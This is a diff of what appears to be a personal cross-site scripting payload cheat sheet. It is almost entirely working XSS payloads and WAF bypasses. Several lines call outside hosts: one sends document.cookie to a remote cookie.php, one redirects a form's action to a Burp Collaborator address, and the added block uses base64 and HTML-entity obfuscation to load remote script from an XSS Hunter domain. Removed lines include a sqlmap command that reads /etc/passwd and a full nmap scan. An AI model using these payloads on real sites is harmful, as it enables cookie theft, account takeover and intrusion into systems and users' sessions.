@@ -42,7 +42,7 @@ edcjks'-alert(1)-'zzknc
 "<br><center><h1>HTML injection </h1></a></center><!--
 
 <iframe src="javascript:alert(1)">
-"><svg onload=document.forms\[1].action='http://pxqs92269gbygl144z1yp0i9u00uoj.burpcollaborator.net/?Hacked'><!--+
+"><svg onload=document.forms\\[1].action='http://pxqs92269gbygl144z1yp0i9u00uoj.burpcollaborator.net/?Hacked'><!--+
 {{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}
 '-alert(document.domain)-'
 aaa<h1>xss<a href='javascript:alert()'><script>alert(XSS)C.html
@@ -98,21 +98,21 @@ javascript:onclick=alert(1);
  <script>alert(String.fromCharCode(88, 115, 115, 32, 66, 121, 32, 79, 108, 100, 77, 111, 104, 97, 109, 109))</script>
 Normal Payload XSS
 <img src=x onerror=alert(1)>
-Status \[ 406 Not Acceptable ]
+Status \\[ 406 Not Acceptable ]
 <style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
 Bypass Payload
 <img src=x onerror=(a=alert,b=1,a(b))>
-Status \[ 200 OK ]
+Status \\[ 200 OK ]
 <iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;
 X-Forwarded-Host: evilhostrl8kmvoG.com
 <svg/onload=alert()>
-"accesskey='x' onclick='confirm\`1\`' //
+"accesskey='x' onclick='confirm\\`1\\`' //
 ========================
-<style>@keyframesa{}b{animation:a;}</style><b/onanimationstart=prompt\`${document.domain}&#x60;>
+<style>@keyframesa{}b{animation:a;}</style><b/onanimationstart=prompt\\`${document.domain}&#x60;>
 <javas style=font-size:500px onmouseover=location=tagName%2binnerHTML%2bURL>cript:</javas>#%0Aalert(1)
 '444-555-4455 <img src=x onerror=alert(1)>'
  and put %23.html CRLF and XSS stored on ton.twitter.com
-"><img src=x onerror=prompt\``>
+"><img src=x onerror=prompt\\``>
 &url="><
 <script src=”<%= ResolveUrl(“~/Script.js”) %>”></script>
 /(A(%22onerror='alert%601%60'testabcd))/
@@ -122,20 +122,34 @@ X-Forwarded-Host: evilhostrl8kmvoG.com
 
 <h1>holaaaaaaa||<a href="http://<a href="http://<a href="http://<a href="javascript:window.location='https://growncheckerworl.com/cookie.php?cookie=document.cookie'" >aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">gle.com</a> hhhk
 
-Ij48aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoZG9jdW1lbnQuZG9tYWluKT4=
-<x onauxclick=a=alert,a(domain)>click
-"%3c%3c%73%63%72%5c%61%61%61%2f%73%72%63%3d%3e%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%70%6c%61%79%73%74%61%74%69%6f%6e%20%72%65%66%6c%65%63%74%65%64%20%78%73%73%20%42%59%20%42%34%47%47%33%52%22%29%3c%2f%73%63%72%69%70%74%3e"
+I<!--StartFragment-->
 
-SSI directives i.e < ! # = / . “ ? and \[a-zA-Z0–9] are 
+"><script src=https://xsshunterco.xss.ht></script>
 
-<!--#exec emd="is"-->
 
-JAVASCRIPT:alert%09(document.domain)
 
-sqlmap -u "link" --file-read="/etc/passwd"
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzaHVudGVyY28ueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
 
-walla hich 4
-baw zmapa atwani
-nmap -p 1-65535 -T4 -A -v -iL C:\Users\omer\Desktop\iq.txt -oX C:\Users\omer\Desktop\iq.xml
 
-http://brutelogic.com.br/poc.svg
+
+"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzaHVudGVyY28ueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>
+
+
+
+<script>$.getScript("//xsshunterco.xss.ht")</script>
+
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xsshunterco.xss.ht\';document.body.appendChild(a)')
+
+
+
+"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzaHVudGVyY28ueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; autofocus>
+
+
+
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xsshunterco.xss.ht");a.send();</script>
+
+
+
+"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xsshunterco.xss.ht&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+
+<!--EndFragment-->
